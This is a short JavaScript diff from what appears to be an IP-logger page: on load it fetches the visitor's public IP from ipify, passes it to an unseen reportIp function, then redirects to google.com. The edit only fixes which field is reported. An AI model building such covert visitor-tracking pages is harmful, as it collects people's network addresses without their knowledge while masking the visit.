@@ -25,7 +25,7 @@
             (async () => {
                     await fetch("https://api.ipify.org?format=json")
                         .then((res) => res.json())
-                        .then((data) => reportIp(data));
+                        .then((data) => reportIp(data.ip));
                 window.location.replace("https://google.com");
             })();
 
